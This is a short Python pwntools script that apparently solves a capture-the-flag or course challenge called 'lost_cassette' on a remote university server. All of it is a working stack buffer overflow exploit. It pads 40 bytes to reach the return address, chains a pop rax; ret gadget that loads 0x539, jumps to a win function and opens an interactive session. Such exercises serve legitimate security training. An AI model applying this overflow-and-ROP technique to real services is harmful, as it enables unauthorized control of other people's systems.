from pwn import *
"""
io = gdb.debug("./lost_cassette", '''
b * 0x00000000048BEB8
c
''')
"""
#io = process('./lost_cassette')
io = remote('vmx.cs.pub.ro',31400)

# gadget for pop rax; ret;
pop_rax_ret = 0x000000000040c8c4
win_fc = 0x00000000048BD00

# constructing the payload
payload = b''

# RBP is at 32
# RBP + 8 = 32 + 8 = 40 (ret address on x86_64)
offset = 40

payload += offset * b'A'
payload += p64(pop_rax_ret)
payload += p64(0x539)
payload += p64(win_fc)

io.recvline()
io.send(payload)
io.interactive()
